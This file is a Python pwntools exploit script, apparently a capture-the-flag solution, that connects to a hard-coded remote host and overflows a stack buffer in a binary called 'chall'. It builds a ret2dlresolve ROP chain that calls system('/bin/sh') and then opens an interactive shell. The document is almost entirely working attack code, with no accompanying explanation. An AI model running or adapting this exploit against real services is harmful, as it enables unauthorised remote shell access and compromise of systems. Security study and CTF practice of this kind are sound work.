#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 34.125.56.151 --port 17010 chall
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('chall')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '34.125.56.151'
port = int(args.PORT or 3333)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak *0x{exe.entry:x}
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)
io = start()
rop = ROP(exe)
dlresolve = Ret2dlresolvePayload(exe,symbol="system",args=["/bin/sh"])
pop_rdi = rop.find_gadget(['pop rdi','ret'])[0]
pop_rsi = rop.find_gadget(['pop rsi','ret'])[0]
pop_rdx = rop.find_gadget(['pop rdx','ret'])[0]

rop.raw(p64(pop_rdi+1) + p64(pop_rdi) + p64(dlresolve.data_addr) + p64(exe.plt['gets']))
rop.ret2dlresolve(dlresolve)
pad=88
payload =b'\0'*pad + rop.chain()
io.sendline(payload)
io.sendline(dlresolve.payload)

io.sendline(payload)

# shellcode = asm(shellcraft.sh())
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)

io.interactive()

